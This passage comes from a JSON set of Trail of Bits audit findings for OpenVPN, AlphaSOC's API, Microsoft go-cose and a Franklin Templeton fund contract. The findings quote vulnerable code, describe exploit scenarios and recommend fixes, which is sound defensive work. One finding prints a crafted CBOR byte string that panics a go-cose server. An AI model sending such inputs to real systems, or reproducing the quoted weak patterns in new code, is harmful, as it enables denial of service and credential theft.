        "body": "The OpenVPN code supports both the NTLMv1 and NTLMv2 proxy authentication methods. NTLM is an insecure and legacy authentication protocol that has been superseded by NTLMv2. NTLM (v1) uses cryptographically weak algorithms, such as MD4 and DES, to represent users passwords. It is also vulnerable to relay attacks. Note that other proxy authentication methods are also not safe when used through an unencrypted (HTTP) channel, as described in nding TOB-OVPN-11. However, a compromised NTLM credential can impact the other environments where it is used. Also, all currently supported versions of Windows support NTLMv2. Furthermore, although the code supports NTLMv2, the documentation pages do not mention it as a valid authentication method. bool ntlmv2_enabled = (p->auth_method == HTTP_AUTH_NTLM2); ... if (ntlmv2_enabled) else /* Generate NTLM response */ { { /* Generate NTLMv2 response */ } unsigned char key1[DES_KEY_LENGTH], key2[DES_KEY_LENGTH]; unsigned char key3[DES_KEY_LENGTH]; create_des_keys(md4_hash, key1); cipher_des_encrypt_ecb(key1, challenge, ntlm_response); create_des_keys(&md4_hash[DES_KEY_LENGTH - 1], key2); cipher_des_encrypt_ecb(key2, challenge, &ntlm_response[DES_KEY_LENGTH]); create_des_keys(&md4_hash[2 * (DES_KEY_LENGTH - 1)], key3); cipher_des_encrypt_ecb(key3, challenge, &ntlm_response[DES_KEY_LENGTH * 2]); } Figure 7.1: NTLM is considered insecure, as it relies to MD4 and DES ECB (openvpn/src/openvpn/ntlm.c#L220-L374) Recommendations Short term, deprecate the NTLMv1 proxy authentication mechanism and consider removing support for it in future OpenVPN versions. Additionally, improve the documentation to highlight the insecurity of the NTLMv1 authentication method and to advise users to use the more secure NTLMv2 method. If TLS proxy support is added, encourage users to use it as well.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "8. Decoding username can silently cause truncated or empty username ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf",
        "body": "In the get_auth_challenge function, the separate parts of the auth_challenge are decoded and veried. The user eld is encoded using Base64, and the openvpn_base64_decode function is used to decode it. The return value is not checked for success (gure 8.1). Failure to decode the work string into ac->user will silently pass. Since the ac->user eld is allocated with the \"clear\" allocation ag set, this would leave no or partially decoded content in the ac->user eld. struct auth_challenge_info * get_auth_challenge(const char *auth_challenge, struct gc_arena *gc) { ... ac->user = (char *) gc_malloc(strlen(work)+1, true, gc); openvpn_base64_decode(work, (void *)ac->user, -1); Figure 8.1: Failed Base64-decoding silently corrupts the stored username. (src/openvpn/misc.c#457458) The get_auth_challenge function is called in the get_user_pass_cr function when OpenVPN is compiled with the management interface enabled and when the username/password are provided from standard input (gure 8.2). Although this nding does not seem a direct security risk, we include it so that similar mistakes can be avoided in the future. bool get_user_pass_cr(..., const char *auth_challenge) { ... // Get username/password from standard input? if (username_from_stdin || password_from_stdin || response_from_stdin) { #ifdef ENABLE_MANAGEMENT if (auth_challenge && (flags & GET_USER_PASS_DYNAMIC_CHALLENGE) && response_from_stdin) { struct auth_challenge_info *ac = get_auth_challenge(auth_challenge, &gc); Figure 8.2: Code that calls the get_auth_challenge (src/openvpn/misc.c#L283-L291). Recommendations Short term, verify the return value of the openvpn_base64_decode function in the get_auth_challenge function and take necessary action on failure. Long term, consider marking functions that can fail with [[nodiscard]] attributea C23 featureto require handling the return value.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Lack of TLS support by the HTTP and SOCKS proxy may lead to compromise of a user's proxy authentication credentials ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf",
        "body": "OpenVPN allows clients to connect to the OpenVPN server through a HTTP and SOCKS proxies. However, it does not implement TLS for authentication to the proxy server. Without TLS, an attacker who observes or intercepts the authentication trac between a user and proxy can compromise the proxy authentication credentials, as all of the available authentication methods (Basic, Digest, and NTLM) have weaknesses. These risks are not documented by OpenVPN nor is the user warned of the same. Recommendations Short term, alert users of the risks of using unencrypted HTTP proxy authentication in the documentation. Long term, consider adding support for using HTTPS (TLS) for proxy authentication. Additionally,",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Implicit conversions that lose integer precision ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf",
        "body": "The code contains many cases where variables of the integer class are implicitly converted from one type to another in a way that risks altering the value. For example, building with clang and -Wshorten-64-to-32 ags 128 places where a 64-bit variable is passed to a function using a 32-bit type for the argument. Each such case is a potential problem if there is ever a case where the value before conversion exceeds the maximum value for the corresponding receiving type, or if the signedness is changed by the conversion. Exploit Scenario Mallory nds a place in the code where such a truncation causes a too-small memory allocation and uses this memory write primitive to corrupt application memory. Recommendations Short term, triage the conversion warnings to eliminate those where the conversion is deemed safe, and update the types used where it is not. Using CodeQL rules and value analysis can facilitate this somewhat. For example, create a rule that returns a conversion warning only if the value analysis cannot prove that the value is safe. Long term, as the codebase is updated, incrementally introduce explicit casts and, unless it is clear from the adjacent code, add a note why the cast is safe. This will help future code audits, as it makes the developers intention clear.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. The OpenVPN build system does not enable compiler security mitigations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf",
        "body": "The OpenVPN build system on Linux does not explicitly enable modern compiler security mitigations, which may cause users to use less secure congurations if they build the OpenVPN binaries themselves without extra caution. This would make it easier for an attacker who nds a low-level vulnerability to exploit a bug and gain control over the process. Modern compilers support exploit mitigations including the following:  NX (non-executable data)  PIE (a position-independent executable, which is position-independent code for address space layout randomization (ASLR))  Stack canaries (for buer overow detection)  RELRO (for data section hardening)  Source fortication (for buer overow detection and format string protection)  Stack clash protection (for the detection of clashes between a stack pointer and another memory region)  CFI (control ow integrity)  SafeStack (for stack overow protection) For details on these exploit mitigation technologies, see Appendix F: Compiler Mitigations. The severity of this nding is undetermined as compilers and package maintainers enable some of these mitigations by default, and we have not investigated if this issue actually concerns OpenVPN users; it is possible that it does. Additionally, we have not reviewed the security hardening ags on MacOS or Windows, and we recommend doing this for OpenVPN clients on those platforms. Recommendations Short term, enable security mitigations for OpenVPN binaries using the compiler and linker ags described in Appendix F: Compiler Mitigations. Although compilers often enable certain mitigations by default, explicitly enabling them will ensure that they will be used regardless of a compilers defaults. Long term, enable security mitigations for all OpenVPN binaries and add a scan for them with checksec.rs or BinSkim Binary Analyzer into the CI/CD pipeline to ensure that certain options are always enabled. This will make it more dicult for an attacker to exploit any bugs found in the binaries. For additional assurance, consider verifying whether the ASLR system-wide setting is enabled during startup by checking the value stored in the /proc/sys/kernel/randomize_va_space le; if the value is below 2, designate it for future investigation. Also track the development of the Linux kernel conguration aimed at making the randomize_va_space setting read-only; update the kernel and use that option when it becomes available. We also recommend reviewing possible security hardening options on Windows and MacOS builds. References  \"Getting the maximum of your C compiler, for security\"  Debian hardening recommendations  GCC man page  LD man page (see -z keywords)",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. The ntlm_phase_3 function does not verify if it received the correct length of the challenge data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf",
        "body": "The ntlm_phase_3 function decodes a Base64 payload into the buf2 buer, from which the NTLM challenge bytes are then extracted (gure 14.1). However, the code does not verify that the decoded data is big enough to include the challenge bytes. As a result, if the decoded Base64 data is shorter than expected, the code will copy the previous data stored in the buf2 buer (which are all zeroes due to the CLEAR(buf2) call beforehand). The severity of this nding is informational since the buf2 buer is cleared before it is copied from. If that were not the case, the challenge extraction would copy uninitialized data and could leak sensitive information such as memory addresses to the proxy server this code talks to. const char* ntlm_phase_3(/* (...) */) { // (...) uint8_t buf2[128]; /* decoded reply from proxy */ // (...) CLEAR(buf2); // (...) ret_val = openvpn_base64_decode(phase_2, buf2, -1); if (ret_val < 0) { // no check for the size of data decoded in buf2 return NULL; } /* we can be sure that phase_2 is less than 128 * therefore buf2 needs to be (3/4 * 128) */ /* extract the challenge from bytes 24-31 */ for (i = 0; i<8; i++) { challenge[i] = buf2[i+24]; } Figure 14.1: openvpn/src/openvpn/ntlm.c#L256-L269 Recommendations Short term, change the ntlm_phase_3 code to verify that the length of the decoded buer matches the expected length of the challenge data, which is eight bytes. The length of the decoded buer is the result of the openvpn_base64_decode call and so is stored in the ret_val variable (if the decoding succeeds and does not return -1). Long term, create unit tests to test unhappy paths which contain truncated HTTP request/response data. This will help to prevent similar issues in the future.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. The establish_http_proxy_passthru function proxy-authenticate header check is insu\u0000cient ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-12-openvpn-openvpn2-securityreview.pdf",
        "body": "The establish_http_proxy_passthru function's parsing of the \"Proxy-Authenticate: NTLM \" header is incorrect. Instead of matching the exact header name, the function reads the request lines until it nds a line that matches the \"%*s NTLM %128s\" format. This may result in processing an incorrect header that would contain the \"NTLM\" string as the \"Proxy-Authenticate\" header. Additionally, the function does not take into account a possible case where the Proxy-Authenticate header is duplicated. In such a case, the code will use the rst header, while maybe it should not process such a request. The severity of this nding is undetermined as we haven't fully analyzed the impact of this issue due to time constraints. bool establish_http_proxy_passthru(/* (...) */) { // (...) /* look for the phase 2 response */ while (true) { if (!recv_line(sd, buf, sizeof(buf), /* (...) */)) { goto error; } chomp(buf); msg(D_PROXY, \"HTTP proxy returned: '%s'\", buf); openvpn_snprintf(get, sizeof get, \"%%*s NTLM %%%ds\", (int) sizeof(buf2) - 1); nparms = sscanf(buf, get, buf2); buf2[128] = 0; /* we only need the beginning - ensure it's null terminated. */ /* check for \"Proxy-Authenticate: NTLM TlRM...\" */ if (nparms == 1){ /* parse buf2 */ msg(D_PROXY, \"auth string: '%s'\", buf2); break; } } Figure 15.1: openvpn/src/openvpn/proxy.c#L759-L781 Recommendations Short term, investigate this issue and x it. Consider changing the establish_http_proxy_passthru function to: 1) process the NTLM data only in case the correct Proxy-Authenticate header is received and 2) to account for the situation when this header may be duplicated, in which case the function should probably reject such a request.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. API keys are leaked outside of the application server ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf",
        "body": "API key verication is handled by the AuthKey function (gure 1.1). This function uses the auth method, which passes the plaintext value of a key to the database (as part of the database query), as shown in gure 1.2. func (s *CustomerStore) AuthKey(ctx context.Context, key string) (*clap.User, error) { internalUser, err := s.authInternalKey(ctx, key) if err == store.ErrInvalidAPIKey { return s.auth(ctx, \"auth_api_key\", key) } else if err != nil { return nil, err } return internalUser, nil } Figure 1.1: The call to the auth method (clap/internal/dbstore/customer.go#L73L82) func (s *CustomerStore) auth(ctx context.Context, funName string, value interface{}) (*clap.User, error) { user := &clap.User{ Type: clap.UserTypeCustomer, } err := s.db.QueryRowContext(ctx, fmt.Sprintf(` SELECT ws.sid, ws.workspace_id, ws.credential_id FROM console_clap.%s($1) AS ws LEFT JOIN api.disabled_user AS du ON du.user_id = ws.sid WHERE du.user_id IS NULL LIMIT 1 `, pq.QuoteIdentifier(funName)), value).Scan(&user.ID, &user.WorkspaceID, &user.CredentialID) ... } Figure 1.2: The database query, with an embedded plaintext key (clap/internal/dbstore/customer.go#L117L141) Moreover, keys are generated in the database (gure 1.3) rather than in the Go code and are then sent back to the API, which increases their exposure. gk := &store.GeneratedKey{} err = tx.QueryRowContext(ctx, ` SELECT sid, key FROM console_clap.key_request() `).Scan(&gk.CustomerID, &gk.Key) Figure 1.3: clap/internal/dbstore/customer.go#L50L53 Exploit Scenario An attacker gains access to connection trac between the application server and the database, steals the API keys being transmitted, and uses them to impersonate their owners. Recommendations Short term, have the API hash keys before sending them to the database, and generate API keys in the Go code. This will reduce the keys exposure. Long term, document the trust boundaries traversed by sensitive data.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Unused insecure authentication mechanism ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf",
        "body": "The clap code contains an unused insecure authentication mechanism, the FixedKeyAuther strategy, that stores congured plaintext keys (gure 2.1) and veries them through a non-constant-time comparison (gure 2.2). The use of this comparison creates a timing attack risk. /* if cfg.Server.SickMode { if cfg.Server.ApiKey == \"\" { config\") log15.Crit(\"In sick mode, api key variable must be set in os.Exit(1) } auther = FixedKeyAuther{ ID: -1, Key: cfg.Server.ApiKey, } } else*/ Figure 2.1: clap/server/server.go#L57L67 type FixedKeyAuther struct { Key string ID int64 } func (a FixedKeyAuther) AuthKey(ctx context.Context, key string) (*clap.User, error) { if key != \"\" && key == a.Key { return &clap.User{ID: a.ID}, nil } return nil, nil } Figure 2.2: clap/server/auth.go#L19L29 Exploit Scenario The FixedKeyAuther strategy is enabled. This increases the risk of a key leak, since the authentication mechanism is vulnerable to timing attacks and stores plaintext API keys in memory. Recommendations Short term, to prevent API key exposure, either remove the FixedKeyAuther strategy or change it so that it uses a hash of the API key. Long term, avoid leaving commented-out or unused code in the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Use of panics to handle user-triggerable errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf",
        "body": "The clap HTTP handler mechanism uses panic to handle errors that can be triggered by users (gures 3.1 and 3.2). Handling these unusual cases of panics requires the mechanism to lter out errors of the RequestError type (gure 3.3). The use of panics to handle expected errors alters the panic semantics, deviates from callers expectations, and makes reasoning about the code and its error handling more dicult. func (r *Request) MustUnmarshal(v interface{}) { ... err := json.NewDecoder(body).Decode(v) if err != nil { panic(BadRequest(\"Failed to parse request body\", \"jsonErr\", err)) } } Figure 3.1: clap/lib/clap/request.go#L31L42 // MustBeAuthenticated returns user ID if request authenticated, // otherwise panics. func (r *Request) MustBeAuthenticated() User { user, err := r.User() if err == nil && user == nil { err = errors.New(\"user is nil\") } else if !user.Valid() { err = errors.New(\"user id is zero\") } if err != nil { panic(Error(\"not authenticated: \" + err.Error())) } return *user } Figure 3.2: clap/lib/clap/request.go#L134L147 defer func() { if e := recover(); e != nil { if err, ok := e.(*RequestError); ok { onError(w, r, err) } else { panic(e) } } }() Figure 3.3: clap/lib/clap/handler.go#L93L101 Recommendations Short term, change the code in gures 3.1, 3.2, and 3.3 so that it adheres to the conventions of handling expected errors in Go. This will simplify the error-handling functionality and the process of reasoning about the code. Reserving panics for unexpected situations or bugs in the code will also help surface incorrect assumptions. Long term, use panics only to handle unexpected errors.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Confusing API authentication mechanism ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf",
        "body": "The clap HTTP endpoint handler code appears to indicate that the handlers perform manual endpoint authentication. This is because when a handler receives a clap.Request, it calls the MustBeAuthenticated method (gure 4.1). The name of this method could imply that it is called to authenticate the endpoint. However, MustBeAuthenticated returns information on the (already authenticated) user who submitted the request; authentication is actually performed by default by a centralized mechanism before the call to a handler. Thus, the use of this method could cause confusion regarding the timing of authentication. func (h *AlertsHandler) handleGet(r *clap.Request) interface{} { // Parse arguments q := r.URL.Query() var minSeverity uint64 if ms := q.Get(\"minSeverity\"); ms != \"\" { var err error minSeverity, err = strconv.ParseUint(ms, 10, 8) if err != nil || minSeverity > 5 { return clap.BadRequest(\"Invalid minSeverity parameter\") } } if h.MinSeverity > minSeverity { minSeverity = h.MinSeverity } filterEventType := q.Get(\"eventType\") user := r.MustBeAuthenticated() ... } Figure 4.1: clap/apiv1/alerts.go#L363L379 Recommendations Short term, add a ServeAuthenticatedAPI interface method that takes an additional user parameter indicating that the handler is already in the authenticated context. Long term, document the authentication system to make it easier for new team members and auditors to understand and to facilitate their onboarding.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Use of MD5 can lead to lename collisions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf",
        "body": "When generating a lename, the deriveQueueFile function uses an unsafe MD5 hash function to hash the destinationID that is included in the lename (gure 5.1). func deriveQueueFile(outputType, destinationID string) string { return fmt.Sprintf(\"%s-%x.bdb\", outputType, md5.Sum([]byte(destinationID))) } Figure 5.1: ae/config/config.go#L284L286 Exploit Scenario An attacker with control of a destinationID value modies the value, with the goal of causing a hash collision. The hash computed by md5.Sum collides with that of an existing lename. As a result, the existing le is overwritten. Recommendations Short term, replace the MD5 function with a safer alternative such as SHA-2. Long term, avoid using the MD5 function unless it is necessary for interfacing with a legacy system in a non-security-related context.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Overly broad le permissions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf",
        "body": "In several parts of the ae code, les are created with overly broad permissions that allow them to be read by anyone in the system. This occurs in the following code paths:  ae/tools/copy.go#L50  ae/bqimport/import.go#L291  ae/tools/migrate.go#L127  ae/tools/migrate.go#L223  ae/tools/migrate.go#L197  ae/tools/copy.go#L16  ae/main.go#L319 Recommendations Short term, change the le permissions, limiting them to only those that are necessary. Long term, always consider the principle of least privilege when making decisions about le permissions.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Unhandled errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-alphasoc-alphasocapi-securityreview.pdf",
        "body": "The gosec tool identied many unhandled errors in the ae and clap codebases. Recommendations Short term, run gosec on the ae and clap codebases, and address the unhandled errors. Even if an error is considered unimportant, it should still be handled and discarded, and the decision to discard it should be justied in a code comment. Long term, encourage the team to use gosec, and run it before any major release.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Unmarshalling can cause a panic if any header labels are unhashable ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Microsoft-go-cose.pdf",
        "body": "The ensureCritical function checks that all critical labels exist in the protected header. The check for each label is shown in Figure 1.1. 161 if _, ok := h[label]; !ok { Figure 1.1: Line 161 of headers.go The label in this case is deserialized from the users CBOR input. If the label is a non-hashable type (e.g., a slice or a map), then Go will runtime panic on line 161. Exploit Scenario Alice wishes to crash a server running go-cose. She sends the following CBOR message to the server: \\xd2\\x84G\\xc2\\xa1\\x02\\xc2\\x84@0000C000C000. When the server attempts to validate the critical headers during unmarshalling, it panics on line 161. Recommendations Short term, add a validation step to ensure that the elements of the critical header are valid labels. Long term, integrate go-coses existing fuzz tests into the CI pipeline. Although this bug was not discovered using go-coses preexisting fuzz tests, the tests likely would have discovered it if they ran for enough time. Fix Analysis This issue has been resolved. Pull request #78, committed to the main branch in b870a00b4a0455ab5c3da1902570021e2bac12da, adds validations to ensure that critical headers are only integers or strings. 15 Microsoft go-cose Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. crit label is permitted in unvalidated headers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Microsoft-go-cose.pdf",
        "body": "The crit header parameter identies which header labels must be understood by an application receiving the COSE message. Per RFC 8152, this value must be placed in the protected header bucket, which is authenticated by the message signature. Figure 2.1: Excerpt from RFC 8152 section 3.1 Currently, the implementation ensures during marshaling and unmarshaling that if the crit parameter is present in the protected header, then all indicated labels are also present in the protected header. However, the implementation does not ensure that the crit parameter is not present in the unprotected bucket. If a user mistakenly uses the unprotected header for the crit parameter, then other conforming COSE implementations may reject the message and the message may be exposed to tampering. Exploit Scenario A library user mistakenly places the crit label in the unprotected header, allowing an adversary to manipulate the meaning of the message by adding, removing, or changing the set of critical headers. Recommendations Add a check during ensureCritical to verify that the crit label is not present in the unprotected header bucket. Fix Analysis This issue has been resolved. Pull request #81, committed to the main branch in 62383c287782d0ba5a6f82f984da0b841e434298, adds validations to ensure that the crit label is not present in unprotected headers. 16 Microsoft go-cose Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Generic COSE header types are not validated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Microsoft-go-cose.pdf",
        "body": "Section 3.1 of RFC 8152 denes a number of common COSE header parameters and their associated value types. Applications using the go-cose library may rely on COSE-dened headers decoded by the library to be of a specied type. For example, the COSE specication denes the content-type header (label #3) as one of two types: a text string or an unsigned integer. The go-cose library validates only the alg and crit parameters, not content-type. See Figure 3.1 for a list of dened header types. Figure 3.1: RFC 8152 Section 3.1, Table 2 Further header types are dened by the IANA COSE Header Parameter Registry. 17 Microsoft go-cose Security Assessment Exploit Scenario An application uses go-cose to verify and validate incoming COSE messages. The application uses the content-type header to index a map, expecting the content type to be a valid string or integer. An attacker could, however, supply an unhashable value, causing the application to panic. Recommendations Short term, explicitly document which IANA-dened headers or label ranges are and are not validated. Long term, validate commonly used headers for type and semantic consistency. For example, once counter signatures are implemented, the counter-signature (label #7) header should be validated for well-formedness during unmarshalling. 18 Microsoft go-cose Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Canceling all transaction requests causes DoS on MMF system ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf",
        "body": "Any shareholder can cancel any transaction request, which can result in a denial of service (DoS) from the MMF system. The TransactionalModule contract uses transaction requests to store buy and sell orders from users. These requests are settled at the end of the day by the admins. Admins can create or cancel a request for any user. Users can create requests for themselves and cancel their own requests. The TransferAgentGateway contract is an entry point for all user and admin actions. It implements access control checks and forwards the calls to their respective modules. The cancelRequest function in the TransferAgentGateway contract checks that the caller is the owner or a shareholder. However, if the caller is not the owner, the caller is not matched against the account argument. This allows any shareholder to call the cancelRequest function in the TransactionalModule for any account and requestId . function cancelRequest ( address account , bytes32 requestId , string calldata memo ) external override { require ( msg.sender == owner() || IAuthorization( moduleRegistry.getModuleAddress(AUTHORIZATION_MODULE) ).isAccountAuthorized( msg.sender ), \"OPERATION_NOT_ALLOWED_FOR_CALLER\" ); ICancellableTransaction( moduleRegistry.getModuleAddress(TRANSACTIONAL_MODULE) ).cancelRequest(account, requestId, memo); } Figure 1.1: The cancelRequest function in the TransferAgentGateway contract As shown in gure 1.2, the if condition in the cancelRequest function in the TransactionalModule contract implements a check that does not allow shareholders to cancel transaction requests created by the admin. However, this check passes because the TransferAgentGateway contract is set up as the admin account in the authorization module. function cancelRequest ( address account , bytes32 requestId , string calldata memo ) external override onlyAdmin onlyShareholder(account) { require ( transactionDetailMap[requestId].txType > ITransactionStorage.TransactionType.INVALID, \"INVALID_TRANSACTION_ID\" ); if (!transactionDetailMap[requestId].selfService) { require ( IAuthorization(modules.getModuleAddress(AUTHORIZATION_MODULE)) .isAdminAccount( msg.sender ), \"CALLER_IS_NOT_AN_ADMIN\" ); } require ( pendingTransactionsMap[account].remove(requestId), \"INVALID_TRANSACTION_ID\" ); delete transactionDetailMap[requestId]; accountsWithTransactions.remove(account); emit TransactionCancelled(account, requestId, memo); } Figure 1.2: The cancelRequest function in the TransactionalModule contract Thus, a shareholder can cancel any transaction request created by anyone. Exploit Scenario Eve becomes an authorized shareholder and sets up a bot to listen to the TransactionSubmitted event on the TransactionalModule contract. The bot calls the cancelRequest function on the TransferAgentGateway contract for every event and cancels all the transaction requests before they are settled, thus executing a DoS attack on the MMF system. Recommendations Short term, add a check in the TransferAgentGateway contract to allow shareholders to cancel requests only for their own accounts. Long term, document access control rules in a publicly accessible location. These rules should encompass admin, non-admin, and common functions. Ensure the code adheres to that specication by extending unit test coverage for positive and negative expectations within the system. Add fuzz tests where access control rules are the invariants under test.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Lack of validation in the IntentValidationModule contract can lead to inconsistent state ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf",
        "body": "Lack of validation in the state-modifying functions of the IntentValidationModule contract can cause users to be locked out of the system. As shown in gure 2.1, the setDeviceKey function in IntentValidationModule allows adding a device ID and key to multiple accounts, which may result in the unauthorized use of a device ID. function setDeviceKey ( address account , uint256 deviceId , string memory key ) external override onlyAdmin { devicesMap[account].add(deviceId); deviceKeyMap[deviceId] = key; emit DeviceKeyAdded(account, deviceId); } Figure 2.1: The setDeviceKey functions in the IntentValidationModule contract Additionally, a lack of validation in the clearDeviceKey and clearAccountKeys functions can cause the key for a device ID to become zero, which may prevent users from authenticating their requests. function clearDeviceKey ( address account , uint256 deviceId ) external override onlyAdmin { _removeDeviceKey(account, deviceId); } function clearAccountKeys ( address account ) external override onlyAdmin { uint256 [] memory devices = devicesMap[account].values(); for ( uint i = 0 ; i < devices.length; ) { _removeDeviceKey(account, devices[i]); unchecked { i++; } } } Figure 2.2: Functions to clear device ID and key in the IntentValidationModule contract The account-todevice ID mapping and device IDto-key mapping are used to authenticate user actions in an o-chain component, which can malfunction in the presence of these inconsistent states and lead to the authentication of malicious user actions. Exploit Scenario An admin adds the DEV_A device and the KEY_K key to Bob. Then there are multiple scenarios to cause an inconsistent state, such as the following: Adding one device to multiple accounts: 1. An admin adds the DEV_A device and the KEY_K key to Alice by mistake. 2. Alice can use Bobs device to send unauthorized requests. Overwriting a key for a device ID: 1. An admin adds the DEV_A device and the KEY_L key to Alice, which overwrites the key for the DEV_A device from KEY_K to KEY_L . 2. Bob cannot authenticate his requests with his KEY_K key. Setting a key to zero for a device ID: 1. An admin adds the DEV_A device and the KEY_K key to Alice by mistake. 2. An admin removes the DEV_A device from Alices account. This sets the key for the DEV_A device to zero, which is still added to Bobs account. 3. Bob cannot authenticate his requests with his KEY_K key. Recommendations Short term, make the following changes:   Add a check in the setDeviceKey function to ensure that a device is not added to multiple accounts. Add a new function to update the key of an already added device with correct validation checks for the update. Long term, document valid system states and the state transitions allowed from each state. Ensure proper data validation checks are added in all state-modifying functions with unit and fuzzing tests.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Pending transactions cannot be settled ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf",
        "body": "An account removed from the accountsWithTransactions state variable will have its pending transactions stuck in the system, resulting in an opportunity cost loss for the users. The accountsWithTransactions state variable in the TransactionalModule contract is used to keep track of accounts with pending transactions. It is used in the following functions:   The getAccountsWithTransactions function to return the list of accounts with pending transactions The hasTransactions function to check if an account has pending transactions. However, the cancelRequest function in the TransactionalModule contract removes the account from the accountsWithTransactions list for every cancellation. If an account has multiple pending transactions, canceling only one of the transaction requests will remove the account from the accountsWithTransactions list. function cancelRequest ( address account , bytes32 requestId , string calldata memo ) external override onlyAdmin onlyShareholder(account) { require ( transactionDetailMap[requestId].txType > ITransactionStorage.TransactionType.INVALID, \"INVALID_TRANSACTION_ID\" ); if (!transactionDetailMap[requestId].selfService) { require ( IAuthorization(modules.getModuleAddress(AUTHORIZATION_MODULE)) .isAdminAccount( msg.sender ), \"CALLER_IS_NOT_AN_ADMIN\" ); } require ( pendingTransactionsMap[account].remove(requestId), \"INVALID_TRANSACTION_ID\" ); delete transactionDetailMap[requestId]; accountsWithTransactions.remove(account); emit TransactionCancelled(account, requestId, memo); } Figure 3.1: The cancelRequest function in the TransactionalModule contract In gure 3.1, the account has pending transactions, but it is not present in the accountsWithTransactions list. The o-chain components and other functionality relying on the getAccountsWithTransactions and hasTransactions functions will see these accounts as not having any pending transactions. This may result in non-settlement of the pending transactions for these accounts, leading to a loss for the users. Exploit Scenario Alice, a shareholder, creates multiple transaction requests and cancels the last request. For the next settlement process, the o-chain component calls the getAccountsWithTransactions function to get the list of accounts with pending transactions and settles these accounts. After the settlement run, Alice checks her balance and is surprised that her transaction requests are not settled. She loses prots from upcoming market movements. Recommendations Short term, have the code use the unlistFromAccountsWithPendingTransactions function in the cancelRequest function to update the accountsWithTransactions list. Long term, document the system state machine specication and follow it to ensure proper data validation checks are added in all state-modifying functions.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Deauthorized accounts can keep shares of the MMF ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-franklintempleton-moneymarket-securityreview.pdf",
